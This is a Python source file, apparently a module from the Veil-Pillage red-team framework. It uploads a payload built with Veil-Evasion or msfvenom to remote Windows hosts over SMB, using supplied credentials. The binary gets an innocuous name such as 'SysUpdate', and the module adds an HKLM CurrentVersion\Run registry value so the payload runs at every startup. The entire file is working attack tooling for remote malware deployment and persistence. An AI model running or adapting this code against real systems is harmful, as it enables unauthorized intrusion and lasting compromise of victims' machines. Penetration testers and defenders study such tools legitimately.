"""

Uploads a binary and creates a CurrentVersion\Run registry
key to run the binary on system startup.

Module built by @harmj0y

"""

import sys, os

from lib import command_methods
from lib import messages
from lib import helpers
from lib import smb
import settings

# Veil-Evasion import
from modules.common import controller


class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "CurrentVersion\\Run"
        self.description = ("Upload a binary and create a registry entry "
                            "to autorun the binary.")

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["wmis", "[wmis], [winexe], or [smbexec] for triggering"],
                                    "exe_path"          :   ["veil", "[veil] or existing .exe"],
                                    "upload_name"       :   ["SysUpdate", "name to upload the binary as"],
                                    "key_name"          :   ["Update32", "registry key name to use"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        uploadName = self.required_options["upload_name"][0]
        key_name = self.required_options["key_name"][0]


        # if we're using Veil-Evasion for payload generation
        if self.required_options["exe_path"][0].lower() == "veil":

            # create a Veil-Evasion controller object for payload generation
            con = controller.Controller()

            # if we don't have payload specified, jump to the main controller menu
            if not self.args.p:
                payloadPath = con.MainMenu()
            # otherwise, set all the appropriate payload options
            else:
                # pull out any required options from the command line and
                # build the proper dictionary so we can set the payload manually
                options = {}
                if self.args.c:
                    options['required_options'] = {}
                    for option in self.args.c:
                        name,value = option.split("=")
                        options['required_options'][name] = [value, ""]

                # pull out any msfvenom shellcode specification and msfvenom options
                if self.args.msfpayload:
                    options['msfvenom'] = [self.args.msfpayload, self.args.msfoptions]

                # manually set the payload in the controller object
                con.SetPayload(self.args.p, options)

                # generate the payload code
                code = con.GeneratePayload()

                # grab the generated payload .exe name
                payloadPath = con.OutputMenu(con.payload, code, showTitle=True, interactive=False)


            # nicely print the title and module name again (since Veil-Evasion trashes this)
            messages.title()
            print " [*] Executing module: " + helpers.color(self.name) + "..."

            # sanity check if the user exited Veil-Evasion execution
            if not payloadPath or payloadPath == "":
                print helpers.color(" [!] No output from Veil-Evasion", warning=True)
                raw_input("\n [>] Press enter to continue: ")
                return ""

        # if we have a custom-specified .exe, use that instead
        else:
            payloadPath = self.required_options["exe_path"][0]

            # if the .exe path doesn't exist, print and error and return
            if not os.path.exists(payloadPath):
                print helpers.color("\n\n [!] Invalid .exe path specified", warning=True)
                raw_input("\n [>] Press enter to continue: ")
                return ""


        # make sure the name ends with ".exe"
        if not uploadName.endswith(".exe"):
            uploadName += ".exe"

        # copy the resulting binary into the temporary directory with the appropriate name
        os.system("cp "+payloadPath+" /tmp/"+uploadName)

        for target in self.targets:

            baseName = payloadPath.split("/")[-1]

            # upload the payload to C:\Windows\System32\
            smb.uploadFile(target, username, password, "C$", "\\Windows\\","/tmp/"+uploadName)            
            self.output += "[*] Binary '"+baseName+"' uploaded to C:\\Windows\\"+uploadName+" using creds '"+username+":"+password+"' on : " + target + "\n"

            # the registry command to set up the sethc stickkeys backdoor for the binary
            regCommand = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f /v "+key_name+" /t REG_SZ /d \"C:\\Windows\\"+uploadName+"\""

            # execute the sethc command and get the result
            sethcResult = command_methods.executeResult(target, username, password, regCommand, triggerMethod)

            if sethcResult == "":
                self.output += "[!] No result file, CurrentVersion\\Run registry command failed using creds '"+username+":"+password+"' on : " + target + "\n"
            elif "The operation completed successfully" in sethcResult:
                self.output += "[*] CurrentVersion\\Run successfully set using creds '"+username+":"+password+"' on : " + target + "\n"
                # build our cleanup -> deleting this registry run value
                cleanupCMD = "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+key_name+" /f"
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"

